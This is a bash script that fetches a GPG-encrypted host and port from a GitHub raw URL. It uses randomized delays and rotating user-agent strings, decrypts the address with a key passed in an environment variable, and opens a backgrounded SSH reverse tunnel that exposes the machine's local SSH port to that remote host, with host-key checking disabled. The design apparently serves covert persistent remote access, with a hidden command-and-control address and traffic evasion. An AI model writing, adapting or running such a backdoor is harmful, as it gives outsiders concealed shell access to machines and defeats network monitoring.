#!/usr/bin/env bash
set -euo pipefail

# GPG RSA private key via environment variable
if [[ -z "${GPG_KEY_DATA:-}" ]]; then
    echo "Error: environment variable GPG_KEY_DATA is not set." >&2
    exit 1
fi

GPG_KEY="$GPG_KEY_DATA"

# Temporary files and cleanup
KEY_FILE=$(mktemp)
ENC_FILE=$(mktemp)
GPG_HOME=$(mktemp -d)
cleanup() {
    rm -f "$KEY_FILE" "$ENC_FILE"
    rm -rf "$GPG_HOME"
}
trap cleanup EXIT INT TERM

echo "$GPG_KEY" > "$KEY_FILE"
chmod 600 "$KEY_FILE"

export GNUPGHOME="$GPG_HOME"
gpg --batch --import "$KEY_FILE"

# Configuration
ENCRYPTED_URL="https://raw.githubusercontent.com/username/repo/main/encrypted.gpg"
PUBKEY_ID="tunneluser"
SSH_OPTS=(-o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o StrictHostKeyChecking=no)
USER_AGENTS=(
  "Mozilla/5.0 (X11; Linux x86_64)"
  "curl/7.68.0"
  "Wget/1.20.3"
  "python-requests/2.25.1"
)
DELAY_MIN=45
DELAY_MAX=180
RETRY=4

# Random delay
RND_DELAY=$(( RANDOM % (DELAY_MAX - DELAY_MIN + 1) + DELAY_MIN ))
sleep "$RND_DELAY"

# Random user-agent
UA=${USER_AGENTS[RANDOM % ${#USER_AGENTS[@]}]}

# Download function with explicit error handling
fetch_blob() {
    local url=$1
    if command -v curl &>/dev/null; then
        curl -fsSL -H "User-Agent: $UA" "$url"
    elif command -v wget &>/dev/null; then
        wget -qO- --header="User-Agent: $UA" "$url"
    else
        python3 - <<EOF
import sys, urllib.request
try:
    req = urllib.request.Request('$url', headers={'User-Agent': '$UA'})
    sys.stdout.buffer.write(urllib.request.urlopen(req).read())
except Exception as e:
    sys.exit(1)
EOF
    fi
}

# Attempt download with retries
for i in $(seq 1 "$RETRY"); do
    if ENC_BLOB=$(fetch_blob "$ENCRYPTED_URL"); then
        if [[ -n "$ENC_BLOB" ]]; then
            echo "$ENC_BLOB" > "$ENC_FILE"
            break
        fi
    fi
    echo "Download failed, retry $i/$RETRY..." >&2
    sleep $((5 + RANDOM % 5))
    [ "$i" -lt "$RETRY" ] || { echo "Failed to download after $RETRY attempts." >&2; exit 1; }
done

# Decrypt blob
DECRYPTED=$(gpg --batch --decrypt "$ENC_FILE" 2>/dev/null) || {
    echo "Decryption failed." >&2
    exit 1
}

# Parse HOST and PORT robustly (supports IPv6 in [])
if [[ "$DECRYPTED" =~ ^(\[[^]]+\]|[^:]+):([0-9]+)$ ]]; then
    HOST="${BASH_REMATCH[1]}"
    PORT="${BASH_REMATCH[2]}"
else
    echo "Error: Decrypted content is not in HOST:PORT format." >&2
    exit 1
fi

# SSH reverse tunnel
echo "Connecting to $HOST:$PORT as $PUBKEY_ID..."
exec ssh -fN "${SSH_OPTS[@]}" -R "$PORT:localhost:22" "$PUBKEY_ID@$HOST"
